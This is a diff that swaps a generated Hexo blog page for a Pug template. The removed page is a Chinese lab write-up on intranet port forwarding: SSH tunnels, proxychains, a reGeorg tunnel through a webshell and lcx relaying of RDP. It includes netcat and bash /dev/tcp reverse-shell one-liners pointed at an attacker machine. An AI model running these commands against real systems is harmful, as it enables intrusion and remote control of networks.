@@ -1,242 +1,39 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <link rel="shortcut icon" href="/c1y2m3.github.io/img/favicon.ico">
+extends includes/layout
 
-    <title>
-        
-        关于内网端口转发学习 - undefined
-        
-    </title>
+block content
 
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/aircloud.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
-    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
-    <!-- ga & ba script hoook -->
-    <script></script>
-</head>
+    section#wrapper.post
+        article
+            header
+                h1!=page.title
+                h2.headline!=date(page.date, 'MMM DD, YYYY h:mm')
+                    |·
+                    |#{wordcount(page.content)} words
+                    |·
+                    |#{min2read(page.content)} minutes read
+                    span.tags
 
-<body>
+            if toc(page.content)
+                div#toc!=toc(page.content,{list_number:false})
 
-<div class="site-nav-toggle" id="site-nav-toggle">
-    <button>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-        <span class="btn-bar"></span>
-    </button>
-</div>
+            section#post-body!=page.content
 
-<div class="index-about">
-    <i>  </i>
-</div>
+            - var prev = page.prev ? page.prev.path : false;
+            - var next = page.next ? page.next.path : false;
+            nav#post-nav
+                span.prev
+                    if page.prev
+                        a(href=url_for(prev))
+                            span.arrow ←
+                            | Newer Posts
+                span.next
+                    if page.next
+                        a(href=url_for(next))
+                            | Older Posts
+                            span.arrow →
 
-<div class="index-container">
-    
-    <div class="index-left">
-        
-<div class="nav" id="nav">
-    <div class="avatar-name">
-        <div class="avatar ">
-            <img src="/c1y2m3.github.io/">
-        </div>
-        <div class="name">
-            <i>John Doe</i>
-        </div>
-    </div>
-    <div class="contents" id="nav-content">
-        <ul>
-            <li>
-                <a href="/c1y2m3.github.io/">
-                    <i class="iconfont icon-shouye1"></i>
-                    <span>HOME</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/tags">
-                    <i class="iconfont icon-biaoqian1"></i>
-                    <span>TAGS</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/archives">
-                    <i class="iconfont icon-guidang2"></i>
-                    <span>ARCHIVES</span>
-                </a>
-            </li>
-            <li>
-                <a href="/c1y2m3.github.io/about/">
-                    <i class="iconfont icon-guanyu2"></i>
-                    <span>ABOUT</span>
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-    
-        <div id="toc" class="toc-article">
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用SSH隧道-B作为正向代理，-做动态端口转发"><span class="toc-text">利用SSH隧道,B作为正向代理， 做动态端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-2-D-2333-rootk-172-28-100-188"><span class="toc-text">ssh -2 -D 2333 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vim-etc-proxychains-conf"><span class="toc-text">vim /etc/proxychains.conf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B作为正向代理，进行单一的端口转发"><span class="toc-text">利用ssh隧道，B作为正向代理，进行单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-text"> ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><span class="toc-text">ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用ssh隧道，B做反向代理，做单一的端口转发"><span class="toc-text">利用ssh隧道，B做反向代理，做单一的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><span class="toc-text">ssh -R 7777:172.28.100.155:80 root@172.28.100.51</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reGeorg"><span class="toc-text">reGeorg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows下-的端口转发"><span class="toc-text">Windows下 的端口转发 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux下的使用："><span class="toc-text">Linux下的使用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lcx转发："><span class="toc-text">lcx转发：</span></a></li></ol>
-</div>
-    
-</div>
-
-
-<div class="search-field" id="search-field">
-    <div class="search-container">
-        <div class="search-input">
-            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input">
-            <span id="begin-search">search</span>
-        </div>
-        <div class="search-result-container" id="search-result-container">
-
-        </div>
-    </div>
-</div>
-
-        <div class="index-about-mobile">
-            <i>  </i>
-        </div>
-    </div>
-    
-    <div class="index-middle">
-        <!-- Main Content -->
-        
-
-
-<div class="post-container">
-    <div class="post-title">
-        关于内网端口转发学习
-    </div>
-
-    <div class="post-meta">
-        <span class="attr">Post：<span>2018-10-17 00:34:14</span></span>
-        
-        
-        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
-</span>
-
-    </div>
-    <div class="post-content ">
-        <p>空闲之余,故学习下端口转发的原理和实践以便日后查看。</p>
-<p>首先，区分下正向代理和反向代理 </p>
-<p><strong>A  -B  -C </strong></p>
-<p>A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。 </p>
-<p>反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。</p>
-<p>首先 </p>
-<p>开两台实验机：<br>A（172.28.100.51） Kali 具有攻击环境<br>B (172.28.100.188) 用来代理的服务端<br>C (172.28.100.155)   web内网主机 </p>
-<h2 id="利用SSH隧道-B作为正向代理，-做动态端口转发"><a href="#利用SSH隧道-B作为正向代理，-做动态端口转发" class="headerlink" title="利用SSH隧道,B作为正向代理， 做动态端口转发"></a>利用SSH隧道,B作为正向代理， 做动态端口转发</h2><p>在A上面运行：</p>
-<h2 id="ssh-2-D-2333-rootk-172-28-100-188"><a href="#ssh-2-D-2333-rootk-172-28-100-188" class="headerlink" title="ssh -2 -D 2333 rootk@172.28.100.188"></a><code>ssh -2 -D 2333 rootk@172.28.100.188</code></h2><p>这条命令是将A本地的2333端口，与B的22端口建立Socks连接。</p>
-<p>如果需要访问C的80端口，  浏览器需要侦听127.0.0.1：2333 socks代理 </p>
-<p>直接在A扫描C的端口 ，调用proxychains 侦听 127.0.0.1 2333</p>
-<h2 id="vim-etc-proxychains-conf"><a href="#vim-etc-proxychains-conf" class="headerlink" title="vim /etc/proxychains.conf"></a><code>vim /etc/proxychains.conf</code></h2><p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73" alt=""></p>
-<p><code>proxychains nmap -Pn -sT 172.28.100.155</code></p>
-<h2 id="利用ssh隧道，B作为正向代理，进行单一的端口转发"><a href="#利用ssh隧道，B作为正向代理，进行单一的端口转发" class="headerlink" title="利用ssh隧道，B作为正向代理，进行单一的端口转发 "></a>利用ssh隧道，B作为正向代理，进行单一的端口转发 </h2><h2 id="ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><a href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188" class="headerlink" title=" ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188"></a> <code>ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</code></h2><p>同理，需要设置socks代理 ， 127.0.0.1 1111</p>
-<p>A访问127.0.0.1:1111 相当于访问C的 80端口 </p>
-<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5edcd2711cd136d9f68e1" alt=""></p>
-<h2 id="ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188"><a href="#ssl-L-2222-172-28-100-155-22-rootk-172-28-100-188" class="headerlink" title="ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188"></a><code>ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</code></h2><p>A访问 127.0.0.1:2222 相当与访问172.28.100.155:22 (C) 中间需要<a href="mailto:rootk@172.28.100.188" target="_blank" rel="noopener">rootk@172.28.100.188</a> (B)来转发。</p>
-<h2 id="利用ssh隧道，B做反向代理，做单一的端口转发"><a href="#利用ssh隧道，B做反向代理，做单一的端口转发" class="headerlink" title="利用ssh隧道，B做反向代理，做单一的端口转发 "></a>利用ssh隧道，B做反向代理，做单一的端口转发 </h2><p>A访问127.0.0.1:8888 相当于访问C的80端口</p>
-<p><code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code></p>
-<p><code>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</code></p>
-<p>实验中常出现密钥写入的问题 ，很鸡肋。</p>
-<p>在B上运行： 172.28.100.188</p>
-<h2 id="ssh-R-7777-172-28-100-155-80-root-172-28-100-51"><a href="#ssh-R-7777-172-28-100-155-80-root-172-28-100-51" class="headerlink" title="ssh -R 7777:172.28.100.155:80 root@172.28.100.51"></a><code>ssh -R 7777:172.28.100.155:80 root@172.28.100.51</code></h2><p>B主动去ssh连接，将来自(A)172.28.100.51:8888 的 请求转化成（C）172.28.100.155:80的请求，然后将结果通过ssh隧道，返回给A</p>
-<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8" alt=""></p>
-<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p>Git项目地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a> </p>
-<p><code>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言。</code></p>
-<p>连接172.28.100.188的webshell，上传tunnel.php和 tunnel.nosocket.php 到web目录 </p>
-<p>在 A(Kali）上面去运行 </p>
-<p><code>python reGeorgSocksProxy.py -p 9999 -u http://172.28.100.188/tunnel.nosocket.php</code></p>
-<p>此时会利用172.28.100.188的web服务，与本机的9999端口建立socks代理，就可以用A去打C了。 </p>
-<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b" alt=""></p>
-<h2 id="Windows下-的端口转发"><a href="#Windows下-的端口转发" class="headerlink" title="Windows下 的端口转发 "></a>Windows下 的端口转发 </h2><p>nc反弹</p>
-<p>正向连接</p>
-<p>在内网执行</p>
-<p><code>nc -l -p 5555 -t -e cmd.exe</code></p>
-<p>-t是通过telne模式执行 cmd.exe 程序，可以省略。</p>
-<p>在公网执行:<br><code>nc -nvv 192.168.8.135 5555</code></p>
-<p>反向连接：</p>
-<p>公网：<br><code>nc -lp 5555</code></p>
-<p>在内网机器反弹 #<code>nc -t -e cmd 192.168.8.135 5555</code></p>
-<h2 id="Linux下的使用："><a href="#Linux下的使用：" class="headerlink" title="Linux下的使用："></a>Linux下的使用：</h2><p>攻击机:nc -vlp 9999</p>
-<p>目标机:bash -i &gt;&amp; /dev/tcp/192.168.8.145/9999 0&gt;&amp;1</p>
-<p>命令 ： bash -i 产生一个交互式bash </p>
-<blockquote>
-<p>&amp; /dev/tcp/ip/port 建立给TCP连接，把标准输出和错误重定向到TCP连接<br>0&gt;&amp;1  从TCP连接获取输入 。</p>
-</blockquote>
-<h2 id="lcx转发："><a href="#lcx转发：" class="headerlink" title="lcx转发："></a>lcx转发：</h2><p>内网：172.28.100.89  开有3389的机器<br>公网:172.28.100.58</p>
-<p>由于是本地实验，故拿内网环境充当公网ip，所以正常的情况下，内网可以正常访问公网，而公网环境不能访问内网。</p>
-<p>内网上执行:lcx.exe -slave 公网IP+端口 内网IP+端口</p>
-<p><code>lcx.exe –slave 172.28.100.58 4444 172.28.100.89 3389</code></p>
-<p>将内网的3389转发到公网的4444端口 。</p>
-<p>公网上执行 <code>lcx.exe -listen 4444 5555</code></p>
-<p>此时内网已把 3389端口转发到公网的5555端口，可以通过127.0.0.1:5555 去连接远程客户端 。</p>
-<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6b065db5aa603f192deee" alt=""></p>
-
-        
-        <br>
-        <div id="comment-container">
-        </div>
-        <div id="disqus_thread"></div>
-
-        <div id="lv-container">
-        </div>
-
-    </div>
-</div>
-
-    </div>
-</div>
-
-
-<footer class="footer">
-    <ul class="list-inline text-center">
-        
-        
-
-        
-
-        
-
-        
-
-        
-
-    </ul>
-    
-    <p>
-        <span id="busuanzi_container_site_pv">
-            <span id="busuanzi_value_site_pv"></span>PV
-        </span>
-        <span id="busuanzi_container_site_uv">
-            <span id="busuanzi_value_site_uv"></span>UV
-        </span>
-        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
-</footer>
+            include includes/comment.pug
 
 
 
 
-</body>
-
-<script>
-    // We expose some of the variables needed by the front end
-    window.hexo_search_path = ""
-    window.hexo_root = "/c1y2m3.github.io/"
-    window.isPost = true
-</script>
-<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-
-
-
-</html>
